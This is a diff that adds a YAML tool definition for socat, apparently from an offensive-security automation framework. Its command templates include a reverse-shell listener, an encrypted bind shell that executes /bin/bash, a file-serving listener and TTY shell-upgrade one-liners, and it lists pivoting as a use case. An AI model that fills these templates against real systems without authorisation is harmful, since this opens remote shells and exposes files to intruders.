@@ -1,0 +1,75 @@
+name: socat
+version: 1.7.4.4
+category: networking
+description: "Advanced netcat replacement with support for multiple protocols and SSL"
+
+capabilities:
+  - port_forwarding
+  - ssl_tunneling
+  - file_descriptor_handling
+  - protocol_conversion
+  - reverse_shells
+  - encrypted_shells
+
+target_compatibility:
+  os: [all]
+  protocols: [tcp, udp, ssl, unix_socket, pty]
+
+commands:
+  port_forward:
+    template: "socat TCP-LISTEN:{local_port},fork TCP:{target}:{target_port}"
+    description: "TCP port forwarding"
+    output_format: text
+    estimated_time: null
+  
+  reverse_shell_listener:
+    template: "socat TCP-LISTEN:{port} -"
+    description: "Catch reverse shell"
+    output_format: interactive
+    estimated_time: null
+  
+  encrypted_shell:
+    template: "socat OPENSSL-LISTEN:{port},cert={cert},verify=0,fork EXEC:/bin/bash"
+    description: "Encrypted bind shell"
+    output_format: interactive
+    estimated_time: null
+  
+  file_transfer:
+    template: "socat TCP-LISTEN:{port},reuseaddr,fork OPEN:{file},rdonly"
+    description: "Serve file over TCP"
+    output_format: text
+    estimated_time: null
+
+output_format: interactive
+requires_auth: false
+requires_root: false
+
+use_cases:
+  - "Encrypted reverse shells"
+  - "Port forwarding with SSL"
+  - "Protocol tunneling"
+  - "TTY shells (full interactive)"
+  - "Pivoting"
+
+complementary_tools:
+  - netcat        # Simpler alternative
+  - chisel        # HTTP tunneling
+  - ssh           # Native tunneling
+
+known_issues:
+  - "Complex syntax"
+  - "Requires socat on both ends for encryption"
+  - "Steeper learning curve than netcat"
+
+installation:
+  apt: "apt-get install socat"
+  brew: "brew install socat"
+  yum: "yum install socat"
+
+effectiveness_baseline:
+  port_forwarding: 0.95
+  encrypted_shells: 0.90
+
+shell_upgrades:
+  basic_to_tty: "socat file:`tty`,raw,echo=0 tcp-listen:4444"
+  python_spawn: "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
